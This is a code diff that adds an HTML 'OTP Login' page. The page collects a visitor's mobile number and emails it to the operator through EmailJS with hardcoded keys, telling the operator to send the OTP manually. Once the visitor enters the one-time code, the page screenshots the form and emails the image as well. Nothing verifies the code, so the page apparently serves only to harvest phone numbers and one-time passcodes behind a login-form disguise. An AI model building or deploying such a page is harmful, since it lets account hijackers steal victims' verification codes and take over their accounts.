@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>OTP Login</title>
+  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 {
+      text-align: center;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #4CAF50;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    #otp-section {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="form-container">
+    <h2>Login via OTP</h2>
+    <input type="tel" id="mobile" placeholder="Enter mobile number" required>
+    <button onclick="requestOTP()">Request OTP</button>
+
+    <div id="otp-section">
+      <input type="text" id="otp" placeholder="Enter OTP">
+      <button onclick="submitOTP()">Submit</button>
+    </div>
+  </div>
+
+  <script>
+    emailjs.init("Ah2KJJtjwnL00jKZN"); // Replace with your EmailJS public key
+
+    function requestOTP() {
+      const mobile = document.getElementById("mobile").value;
+      if (!mobile) {
+        alert("Please enter a mobile number.");
+        return;
+      }
+
+      // Show OTP input
+      document.getElementById("otp-section").style.display = "block";
+
+      // Send mobile number via email
+      const templateParams = {
+        mobile: mobile
+      };
+
+      emailjs.send("service_ylg7h1h", "template_9edx7op", templateParams)
+        .then(() => {
+          alert("Mobile number sent via EmailJS. Please send OTP manually.");
+        }, (error) => {
+          console.error("EmailJS Error:", error);
+          alert("Failed to send mobile number.");
+        });
+    }
+
+    function submitOTP() {
+      const otp = document.getElementById("otp").value;
+      if (!otp) {
+        alert("Please enter OTP.");
+        return;
+      }
+
+      // Take screenshot of form
+      html2canvas(document.getElementById("form-container")).then(canvas => {
+        const imageData = canvas.toDataURL("image/png");
+
+        const templateParams = {
+          screenshot: imageData
+        };
+
+        // Use a template that accepts 'screenshot' as base64 image
+        emailjs.send("service_ylg7h1h", "template_9edx7op", templateParams)
+          .then(() => {
+            alert("Screenshot sent successfully.");
+          }, (error) => {
+            console.error("Screenshot send failed:", error);
+            alert("Failed to send screenshot.");
+          });
+      });
+    }
+  </script>
+</body>
+</html>
